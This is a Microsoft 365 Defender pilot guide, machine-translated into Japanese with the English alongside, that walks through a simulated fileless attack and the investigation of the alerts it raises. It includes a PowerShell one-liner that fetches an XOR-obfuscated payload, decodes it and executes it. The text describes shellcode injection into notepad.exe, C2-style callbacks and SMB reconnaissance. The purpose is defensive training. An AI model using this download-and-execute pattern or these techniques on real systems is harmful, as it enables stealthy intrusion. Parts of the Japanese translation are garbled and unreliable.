---
title: Microsoft 365 Defender 攻撃シミュレーションを実行する
description: Microsoft 365 Defender パイロット プロジェクトの攻撃シミュレーションを実行して、展開方法と迅速な修復方法を確認します。
keywords: Microsoft Threat Protection パイロット攻撃シミュレーション、Microsoft Threat Protection パイロット攻撃シミュレーションの実行、Microsoft Threat Protection の攻撃のシミュレーション、Microsoft Threat Protection パイロット プロジェクト、サイバー セキュリティ、高度な持続的脅威、エンタープライズ セキュリティ、デバイス、ID、ユーザー、データ、アプリケーション、インシデント、自動調査と修復、高度な捜問
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: bfe7358d0549a664608c396870cb2b4a5cc58edf
ms.sourcegitcommit: 222fb7fe2b26dde3d8591b61cc02113d6135012c
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 01/06/2021
ms.locfileid: "49760580"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="de377-104">Microsoft 365 Defender 攻撃シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="de377-104">Run your Microsoft 365 Defender attack simulations</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="de377-105">[![計画](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="de377-105">[![Planning](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span></span><br/>[<span data-ttu-id="de377-106">計画</span><span class="sxs-lookup"><span data-stu-id="de377-106">Planning</span></span>](mtp-pilot-plan.md)|<span data-ttu-id="de377-107">[![準備](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span><span class="sxs-lookup"><span data-stu-id="de377-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span></span><br/>[<span data-ttu-id="de377-108">準備</span><span class="sxs-lookup"><span data-stu-id="de377-108">Preparation</span></span>](prepare-mtpeval.md)|![攻撃のシミュレーション](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="de377-110">攻撃のシミュレーション</span><span class="sxs-lookup"><span data-stu-id="de377-110">Simulate attack</span></span>|<span data-ttu-id="de377-111">[![閉じて要約する](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="de377-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span></span><br/>[<span data-ttu-id="de377-112">閉じて要約する</span><span class="sxs-lookup"><span data-stu-id="de377-112">Close and summarize</span></span>](mtp-pilot-close.md)|
|--|--|--|--|
|||<span data-ttu-id="de377-113">*ここにいます。*</span><span class="sxs-lookup"><span data-stu-id="de377-113">*You are here!*</span></span>||

<span data-ttu-id="de377-114">現在、攻撃シミュレーション フェーズに入っている。</span><span class="sxs-lookup"><span data-stu-id="de377-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="de377-115">パイロット環境を準備した後、Microsoft 365 Defender インシデント管理と自動調査および修復機能をテストします。</span><span class="sxs-lookup"><span data-stu-id="de377-115">After preparing your pilot environment, it's time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="de377-116">高度な手法を活用して検出を隠す高度な攻撃をシミュレートするのに役立ちます。</span><span class="sxs-lookup"><span data-stu-id="de377-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="de377-117">この攻撃は、ドメイン コントローラーで開いたサーバー メッセージ ブロック (SMB) セッションを列挙し、ユーザーのデバイスの最近の IP アドレスを取得します。</span><span class="sxs-lookup"><span data-stu-id="de377-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="de377-118">通常、このカテゴリの攻撃には、被害を受けたデバイスにドロップされたファイルは含まれますが、これらはメモリ内でのみ発生します。</span><span class="sxs-lookup"><span data-stu-id="de377-118">This category of attacks usually doesn't include files dropped on the victim's device—they occur solely in memory.</span></span> <span data-ttu-id="de377-119">既存のシステムツールと管理ツールを使用して"陸上に住んでいる" ユーザーは、コードをシステム プロセスに挿入して実行を隠します。このような動作により、ユーザーは検出を回避し、デバイス上で永続化できます。</span><span class="sxs-lookup"><span data-stu-id="de377-119">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="de377-120">このシミュレーションでは、サンプル シナリオは PowerShell スクリプトから始まります。</span><span class="sxs-lookup"><span data-stu-id="de377-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="de377-121">ユーザーをだましてスクリプトを実行する可能性があります。</span><span class="sxs-lookup"><span data-stu-id="de377-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="de377-122">または、以前感染したデバイスから別のコンピューターへのリモート接続からスクリプトが実行される場合があります。攻撃者はネットワーク内を横方向に移動しようとした可能性があります。</span><span class="sxs-lookup"><span data-stu-id="de377-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="de377-123">管理者がリモートでスクリプトを実行してさまざまな管理アクティビティを実行する場合も多いので、これらのスクリプトの検出は困難な場合があります。</span><span class="sxs-lookup"><span data-stu-id="de377-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![プロセスインジェクションと SMB 再データ化攻撃によるファイルレス PowerShell 攻撃の図](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="de377-125">シミュレーション中に、攻撃はシェルコードを一見の高いプロセスに挿入します。</span><span class="sxs-lookup"><span data-stu-id="de377-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="de377-126">このシナリオでは、このシナリオを使用notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="de377-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="de377-127">シミュレーションにこのプロセスを選択しましたが、攻撃者は、シミュレーションなどの長時間実行されるシステム プロセスsvchost.exe。</span><span class="sxs-lookup"><span data-stu-id="de377-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="de377-128">その後、シェルコードは攻撃者のコマンド アンド コントロール (C2) サーバーに接続し、続行方法に関する指示を受け取っています。</span><span class="sxs-lookup"><span data-stu-id="de377-128">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="de377-129">スクリプトは、ドメイン コントローラー (DC) に対する再クエリの実行を試みます。</span><span class="sxs-lookup"><span data-stu-id="de377-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="de377-130">リコンターランスにより、攻撃者は最近のユーザー ログイン情報に関する情報を取得できます。</span><span class="sxs-lookup"><span data-stu-id="de377-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="de377-131">攻撃者はこの情報を取得すると、ネットワーク内を横方向に移動して特定の機密性の高いアカウントに移動できます。</span><span class="sxs-lookup"><span data-stu-id="de377-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="de377-132">最適な結果を得る場合は、可能な限り攻撃シミュレーションの指示に従ってください。</span><span class="sxs-lookup"><span data-stu-id="de377-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

## <a name="simulation-environment-requirements"></a><span data-ttu-id="de377-133">シミュレーション環境の要件</span><span class="sxs-lookup"><span data-stu-id="de377-133">Simulation environment requirements</span></span>

<span data-ttu-id="de377-134">準備フェーズ中にパイロット環境を既に構成済みである場合は、テスト デバイスとドメイン コントローラーの 2 つのデバイスを使用してください。</span><span class="sxs-lookup"><span data-stu-id="de377-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1. <span data-ttu-id="de377-135">テナントで [Microsoft 365 Defender が有効になっているか確認します](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。</span><span class="sxs-lookup"><span data-stu-id="de377-135">Verify your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2. <span data-ttu-id="de377-136">テスト ドメイン コントローラーの構成を確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-136">Verify your test domain controller configuration:</span></span>

   - <span data-ttu-id="de377-137">デバイスは、Windows Server 2008 R2以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="de377-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="de377-138">Id 用に [Microsoft Defender にテスト ドメイン コントローラーを接続し](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 、リモート [管理を有効にします](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。</span><span class="sxs-lookup"><span data-stu-id="de377-138">The test domain controller to [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="de377-139">Id 用 Microsoft Defender と Microsoft Cloud App Security の統合が [有効になっている](https://docs.microsoft.com/cloud-app-security/mdi-integration) か確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/mdi-integration) have been enabled.</span></span>
   - <span data-ttu-id="de377-140">テスト ユーザーがドメインに作成されます。管理者のアクセス許可は必要はありません。</span><span class="sxs-lookup"><span data-stu-id="de377-140">A test user is created on your domain – no admin permissions needed.</span></span>

3. <span data-ttu-id="de377-141">テスト デバイスの構成を確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-141">Verify test device configuration:</span></span>

   1. <span data-ttu-id="de377-142">デバイスは、Windows 10 バージョン 1903 以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="de377-142">Device runs with Windows 10 version 1903 or a later version.</span></span>

   1. <span data-ttu-id="de377-143">テスト デバイスがテスト ドメインに参加している。</span><span class="sxs-lookup"><span data-stu-id="de377-143">Test device is joined to the test domain.</span></span>

   1. <span data-ttu-id="de377-144">[[ウイルス対策] Windows Defenderオンにする](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。</span><span class="sxs-lookup"><span data-stu-id="de377-144">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="de377-145">ウイルス対策を有効にする際に問題Windows Defender、このトラブルシューティング トピック [を参照してください](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="de377-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>

   1. <span data-ttu-id="de377-146">テスト デバイスが Microsoft Defender for Endpoint にオンボード [済み) を確認します](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="de377-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="de377-147">既存のテナントを使用してデバイス グループを実装する場合は、テスト デバイス専用のデバイス グループを作成し、構成 UX のトップ レベルにプッシュします。</span><span class="sxs-lookup"><span data-stu-id="de377-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>

## <a name="run-the-attack-scenario-simulation"></a><span data-ttu-id="de377-148">攻撃シナリオのシミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="de377-148">Run the attack scenario simulation</span></span>

<span data-ttu-id="de377-149">攻撃シナリオのシミュレーションを実行するには:</span><span class="sxs-lookup"><span data-stu-id="de377-149">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="de377-150">テスト ユーザー アカウントを使用してテスト デバイスにログインします。</span><span class="sxs-lookup"><span data-stu-id="de377-150">Log in to the test device with the test user account.</span></span>

2. <span data-ttu-id="de377-151">テスト デバイスWindows PowerShellウィンドウを開きます。</span><span class="sxs-lookup"><span data-stu-id="de377-151">Open a Windows PowerShell window on the test device.</span></span>

3. <span data-ttu-id="de377-152">次のシミュレーション スクリプトをコピーします。</span><span class="sxs-lookup"><span data-stu-id="de377-152">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="de377-153">このドキュメントを Web ブラウザーで開いた場合、特定の文字を失わずにフルテキストをコピーしたり、改行を追加したりせずに、問題が発生する可能性があります。</span><span class="sxs-lookup"><span data-stu-id="de377-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="de377-154">このドキュメントをダウンロードし、Adobe Reader で開きます。</span><span class="sxs-lookup"><span data-stu-id="de377-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="de377-155">プロンプトで、コピーしたスクリプトを貼り付け、実行します。</span><span class="sxs-lookup"><span data-stu-id="de377-155">At the prompt, paste and run the copied script.</span></span>

> [!NOTE]
> <span data-ttu-id="de377-156">リモート デスクトップ プロトコル (RDP) を使用して PowerShell を実行している場合は **、CTRL-V** ホットキーまたは右クリック 貼り付けメソッドが機能しない可能性があります。RDP クライアントで [クリップボード テキストの入力] コマンドを使用します。</span><span class="sxs-lookup"><span data-stu-id="de377-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="de377-157">最近のバージョンの PowerShell でもこの方法が受け入れない場合があります。最初にメモリ内のメモ帳にコピーし、仮想マシンにコピーしてから PowerShell に貼り付ける必要があります。</span><span class="sxs-lookup"><span data-stu-id="de377-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="de377-158">数秒後、notepad.exe<i> 開きます </i> 。</span><span class="sxs-lookup"><span data-stu-id="de377-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="de377-159">シミュレートされた攻撃コードが、次のコードにnotepad.exe。</span><span class="sxs-lookup"><span data-stu-id="de377-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="de377-160">完全なシナリオを体験するために、自動的に生成されたメモ帳インスタンスを開いた状態に保ちます。</span><span class="sxs-lookup"><span data-stu-id="de377-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="de377-161">シミュレートされた攻撃コードは、外部 IP アドレス (C2 サーバーをシミュレートする) との通信を試み、SMB を介してドメイン コントローラーに対する再調整を試みる。</span><span class="sxs-lookup"><span data-stu-id="de377-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="de377-162">このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="de377-163">自動インシデントと対応機能の動作を確認するには、プロセスを開いたnotepad.exe保持します。</span><span class="sxs-lookup"><span data-stu-id="de377-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="de377-164">メモ帳プロセスの自動インシデントと対応の停止が表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>

## <a name="investigate-an-incident"></a><span data-ttu-id="de377-165">インシデントの調査</span><span class="sxs-lookup"><span data-stu-id="de377-165">Investigate an incident</span></span>

> [!NOTE]
> <span data-ttu-id="de377-166">このシミュレーションの手順を説明する前に、次のビデオを見て、インシデント管理が調査プロセスの一環として関連するアラートをまとめる方法、ポータルで検索できる場所、セキュリティ操作でインシデント管理がどのように役立つのかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="de377-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="de377-167">SOC アナリストの視点に切り替えて、Microsoft 365 セキュリティ センター ポータルで攻撃の調査を開始できます。</span><span class="sxs-lookup"><span data-stu-id="de377-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span>

1. <span data-ttu-id="de377-168">任意の [デバイスから Microsoft 365 セキュリティ](https://security.microsoft.com/incidents) センター ポータルのインシデント キューを開きます。</span><span class="sxs-lookup"><span data-stu-id="de377-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2. <span data-ttu-id="de377-169">メニューから **[インシデント** ] に移動します。</span><span class="sxs-lookup"><span data-stu-id="de377-169">Navigate to **Incidents** from the menu.</span></span>

    ![Microsoft 365 セキュリティ センターの左側のメニューに表示されるインシデントのスクリーンショット](../../media/mtp/fig1.png)

3. <span data-ttu-id="de377-171">シミュレートされた攻撃の新しいインシデントがインシデント キューに表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-171">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![インシデント キューのスクリーンショット](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="de377-173">1 つのインシデントとして攻撃を調査する</span><span class="sxs-lookup"><span data-stu-id="de377-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="de377-174">Microsoft 365 Defender は分析を関連付け、さまざまな製品からのすべての関連するアラートと調査を 1 つのインシデント エンティティに集約します。</span><span class="sxs-lookup"><span data-stu-id="de377-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="de377-175">これにより、Microsoft 365 Defender は広範な攻撃のストーリーを示し、SOC アナリストは複雑な脅威を理解して対応することができます。</span><span class="sxs-lookup"><span data-stu-id="de377-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="de377-176">このシミュレーション中に生成されたアラートは同じ脅威に関連付けられるので、1 つのインシデントとして自動的に集計されます。</span><span class="sxs-lookup"><span data-stu-id="de377-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="de377-177">インシデントを表示するには:</span><span class="sxs-lookup"><span data-stu-id="de377-177">To view the incident:</span></span>

1. <span data-ttu-id="de377-178">インシデント キュー **に移動** します。</span><span class="sxs-lookup"><span data-stu-id="de377-178">Navigate to the **Incidents** queue.</span></span>

   ![ナビゲーション メニューからのインシデントのスクリーンショット](../../media/mtp/fig1.png)

2. <span data-ttu-id="de377-180">インシデント名の左側にある円をクリックして、最新のアイテムを選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="de377-181">サイド パネルには、関連するアラートを含むインシデントに関する追加情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="de377-182">各インシデントには、含まれるアラートの属性に基づいて説明する一意の名前があります。</span><span class="sxs-lookup"><span data-stu-id="de377-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   ![シミュレーション中に生成されたアラートが集計されるインシデント ページのスクリーンショット](../../media/mtp/fig4.png)

   <span data-ttu-id="de377-184">ダッシュボードに表示されるアラートは、サービス リソース (Id 用 Microsoft Defender、Microsoft Cloud App Security、エンドポイント用 Microsoft Defender、Microsoft 365 Defender、および Office 365 用 Microsoft Defender) に基づいてフィルター処理できます。</span><span class="sxs-lookup"><span data-stu-id="de377-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="de377-185">[ **インシデントを開く] ページを** 選択して、インシデントに関する詳細を取得します。</span><span class="sxs-lookup"><span data-stu-id="de377-185">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="de377-186">[インシデント **] ページ** では、インシデントに関連するアラートと情報を表示できます。</span><span class="sxs-lookup"><span data-stu-id="de377-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="de377-187">この情報には、アラートに関係するエンティティとアセット、アラートの検出ソース (Microsoft Defender for Identity、EDR)、およびリンクされた理由が含まれます。</span><span class="sxs-lookup"><span data-stu-id="de377-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="de377-188">インシデントアラートリストを確認すると、攻撃の進行状況が表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="de377-189">このビューでは、個々のアラートを表示して調査できます。</span><span class="sxs-lookup"><span data-stu-id="de377-189">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="de377-190">右側のメニューから [ **インシデント** の管理] をクリックして、インシデントにタグを付け、自分に割り当て、コメントを追加することもできます。</span><span class="sxs-lookup"><span data-stu-id="de377-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

   ![[インシデントの管理] をクリックする場所のスクリーンショット](../../media/mtp/fig5a.png)

   ![<span data-ttu-id="de377-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span><span class="sxs-lookup"><span data-stu-id="de377-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a><span data-ttu-id="de377-193">生成されたアラートを確認する</span><span class="sxs-lookup"><span data-stu-id="de377-193">Review generated alerts</span></span>

<span data-ttu-id="de377-194">シミュレートされた攻撃中に生成されたアラートの一部を見てみしましょう。</span><span class="sxs-lookup"><span data-stu-id="de377-194">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="de377-195">シミュレートされた攻撃中に生成されたアラートの一部のみを確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-195">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="de377-196">テスト デバイスで実行されている Windows のバージョンと Microsoft 365 Defender 製品によっては、表示されるアラートが少し異なる場合があります。</span><span class="sxs-lookup"><span data-stu-id="de377-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![生成されたアラートのスクリーンショット](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="de377-198">アラート: 疑わしいプロセスの挿入が観察されました (ソース: エンドポイント EDR 用 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="de377-198">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="de377-199">高度な攻撃者は、高度で高度な手法を使ってメモリを保持し、検出ツールを隠します。</span><span class="sxs-lookup"><span data-stu-id="de377-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="de377-200">一般的な手法の 1 つは、悪意のある実行可能ファイルではなく、信頼されたシステム プロセス内から操作し、検出ツールやセキュリティ操作で悪意のあるコードを見つけるのを難しくする方法です。</span><span class="sxs-lookup"><span data-stu-id="de377-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="de377-201">SOC アナリストがこれらの高度な攻撃をキャッチできるよう、Microsoft Defender for Endpoint のディープ メモリー センサーは、さまざまなプロセス間コードインジェクション技術をこれまでにない可視性でクラウド サービスに提供します。</span><span class="sxs-lookup"><span data-stu-id="de377-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="de377-202">次の図は、エンドポイントにコードを挿入しようとして Defender for Endpoint がどのように検出<i>され、警告notepad.exe。 </i></span><span class="sxs-lookup"><span data-stu-id="de377-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![悪意のある可能性のあるコードの挿入に関する警告のスクリーンショット](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="de377-204">アラート: コマンド ライン引数を指定しないプロセスで発生した予期しない動作 (ソース: エンドポイント EDR 用 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="de377-204">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="de377-205">多くの場合、Microsoft Defender for Endpoint の検出は攻撃手法の最も一般的な属性を対象とします。</span><span class="sxs-lookup"><span data-stu-id="de377-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="de377-206">この方法では、攻撃者が新しい方法に切り替えるという信頼性が高く、高い信頼性が確保されます。</span><span class="sxs-lookup"><span data-stu-id="de377-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="de377-207">大規模な学習アルゴリズムを使用して、組織内および世界中の一般的なプロセスの通常の動作を確立し、これらのプロセスが異常な動作を示す状況を監視します。</span><span class="sxs-lookup"><span data-stu-id="de377-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="de377-208">これらの異常な動作は、多くの場合、不要なコードが導入され、信頼されていないプロセスで実行されている場合を示しています。</span><span class="sxs-lookup"><span data-stu-id="de377-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="de377-209">このシナリオでは、外部の <i> 場所notepad.exe</i> 通信を伴う異常な動作が発生しています。</span><span class="sxs-lookup"><span data-stu-id="de377-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="de377-210">この結果は、悪意のあるコードの導入と実行に使用される特定の方法とは独立しています。</span><span class="sxs-lookup"><span data-stu-id="de377-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="de377-211">このアラートは、追加のバックエンド処理を必要とする機械学習モデルに基づくため、ポータルでこのアラートが表示されるには時間がかかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="de377-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="de377-212">アラートの詳細には、外部 IP アドレス (調査を拡張するピボットとして使用できるインジケーター) が含まれる点に注意してください。</span><span class="sxs-lookup"><span data-stu-id="de377-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="de377-213">通知プロセス ツリーで IP アドレスを選択して、IP アドレスの詳細ページを表示します。</span><span class="sxs-lookup"><span data-stu-id="de377-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![コマンド ライン引数を指定しないプロセスの実行による予期しない動作に関する警告のスクリーンショット](../../media/mtp/fig8.png)

<span data-ttu-id="de377-215">次の図は、選択した IP アドレスの詳細ページを表示します (アラート プロセス ツリーで IP アドレスをクリック)。</span><span class="sxs-lookup"><span data-stu-id="de377-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="de377-216">![IP アドレスの詳細ページのスクリーンショット](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="de377-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>

